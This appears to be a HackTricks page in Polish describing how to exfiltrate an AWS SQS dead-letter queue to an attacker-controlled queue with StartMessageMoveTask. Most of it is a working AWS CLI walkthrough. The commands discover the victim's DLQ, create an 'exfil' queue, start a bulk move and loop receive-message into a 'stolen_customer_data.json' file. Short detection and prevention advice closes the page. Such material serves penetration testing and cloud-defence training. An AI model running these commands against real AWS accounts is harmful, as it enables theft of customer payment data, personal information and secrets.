# AWS – Eksfiltracja wiadomości z DLQ SQS przez StartMessageMoveTask

{{#include ../../../../banners/hacktricks-training.md}}

## Opis

Wykorzystaj zadania przenoszenia wiadomości SQS, aby wykraść wszystkie zgromadzone wiadomości z Dead-Letter Queue (DLQ) ofiary, przekierowując je do kolejki kontrolowanej przez atakującego za pomocą `sqs:StartMessageMoveTask`. Ta technika wykorzystuje natywną funkcję odzyskiwania wiadomości AWS do eksfiltracji wrażliwych danych, które gromadziły się w DLQ przez czas.

## Czym jest Dead-Letter Queue (DLQ)?

Dead-Letter Queue to specjalna kolejka SQS, do której wiadomości są automatycznie wysyłane, gdy nie uda się ich poprawnie przetworzyć w aplikacji głównej. Te nieudane wiadomości często zawierają:
- Wrażliwe dane aplikacji, których nie udało się przetworzyć
- Szczegóły błędów i informacje debugujące
- Dane osobowe (PII)
- Tokeny API, poświadczenia lub inne sekrety
- Krytyczne dla biznesu dane transakcyjne

DLQ działają jak "cmentarz" dla nieudanych wiadomości, co czyni je cennymi celami, ponieważ z upływem czasu gromadzą wrażliwe dane, z którymi aplikacje nie poradziły sobie poprawnie.

## Scenariusz ataku

**Przykład z rzeczywistości:**
1. **Aplikacja e-commerce** przetwarza zamówienia klientów za pomocą SQS
2. **Niektóre zamówienia nie powiodą się** (problemy z płatnością, problemy z magazynem, itd.) i trafiają do DLQ
3. **DLQ gromadzi** tygodnie/miesiące nieudanych zamówień zawierających dane klientów: {"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}
4. **Atakujący uzyskuje dostęp** do poświadczeń AWS z uprawnieniami SQS
5. **Atakujący odkrywa**, że DLQ zawiera tysiące nieudanych zamówień z wrażliwymi danymi
6. **Zamiast próbować uzyskać dostęp do pojedynczych wiadomości** (wolne i oczywiste), atakujący używa `StartMessageMoveTask` do masowego przeniesienia WSZYSTKICH wiadomości do własnej kolejki
7. **Atakujący wydobywa** wszystkie historyczne wrażliwe dane w jednej operacji

## Wymagania
- Kolejka źródłowa musi być skonfigurowana jako DLQ (referencjonowana przez co najmniej jedną politykę RedrivePolicy).
- Uprawnienia IAM (działające jako skompromitowany principal ofiary):
- Na DLQ (źródło): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Na kolejce docelowej: uprawnienie do dostarczania wiadomości (np. polityka kolejki zezwalająca `sqs:SendMessage` od principal ofiary). Dla kolejek w tym samym koncie zwykle dozwolone domyślnie.
- Jeśli SSE-KMS jest włączone: na źródłowym CMK `kms:Decrypt`, a na docelowym CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Wpływ
**Potencjalny wpływ**: Eksfiltracja wrażliwych payloadów zgromadzonych w DLQ (nieudane zdarzenia, PII, tokeny, payloady aplikacji) z dużą prędkością przy użyciu natywnych API SQS. Działa między kontami, jeśli polityka kolejki docelowej pozwala `SendMessage` od principal ofiary.

## Jak wykorzystać

- Zidentyfikuj ARN DLQ ofiary i upewnij się, że jest faktycznie referencjonowany jako DLQ przez jakąś kolejkę (dowolna kolejka wystarczy).
- Utwórz albo wybierz kolejkę docelową kontrolowaną przez atakującego i uzyskaj jej ARN.
- Uruchom zadanie przenoszenia wiadomości z DLQ ofiary do swojej kolejki docelowej.
- Monitoruj postęp lub anuluj w razie potrzeby.

### Przykład CLI: Eksfiltracja danych klientów z DLQ aplikacji e-commerce

**Scenariusz**: Atakujący skompromitował poświadczenia AWS i odkrył, że aplikacja e-commerce używa SQS z DLQ zawierającym nieudane próby przetwarzania zamówień klientów.

1) **Odkryj i zbadaj DLQ ofiary**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Utwórz kolejkę docelową kontrolowaną przez atakującego**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Przeprowadź masowe wykradanie wiadomości**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Zbierz skradzione wrażliwe dane**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Uwagi dotyczące dostępu między kontami
- Kolejka docelowa musi mieć politykę zasobów pozwalającą principalowi ofiary na `sqs:SendMessage` (oraz, jeśli używane, granty/pozwolenia KMS).

## Dlaczego ten atak jest skuteczny

1. **Natywna funkcja AWS**: Wykorzystuje wbudowaną funkcjonalność AWS, co utrudnia wykrycie jako złośliwe
2. **Operacja hurtowa**: Przenosi tysiące wiadomości szybko zamiast powolnego pobierania pojedynczych wiadomości
3. **Dane historyczne**: DLQs gromadzą wrażliwe dane przez tygodnie/miesiące
4. **Poza radarem**: Wiele organizacji nie monitoruje dostępu do DLQ uważnie
5. **Możliwość działania międzykontowego**: Można wyeksfiltrować do własnego konta AWS atakującego, jeśli uprawnienia na to pozwalają

## Wykrywanie i zapobieganie

### Wykrywanie
Monitoruj CloudTrail pod kątem podejrzanych wywołań API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Zapobieganie
1. **Zasada najmniejszych uprawnień**: Ogranicz uprawnienia `sqs:StartMessageMoveTask` tylko do niezbędnych ról
2. **Monitoruj DLQs**: Skonfiguruj alarmy CloudWatch dla nietypowej aktywności w DLQs
3. **Polityki międzykontowe**: Dokładnie przejrzyj polityki kolejek SQS zezwalające na dostęp międzykontowy
4. **Szyfruj DLQs**: Użyj SSE-KMS z ograniczonymi politykami kluczy
5. **Regularne czyszczenie**: Nie pozwalaj, aby wrażliwe dane gromadziły się w DLQs bezterminowo

{{#include ../../../../banners/hacktricks-training.md}}
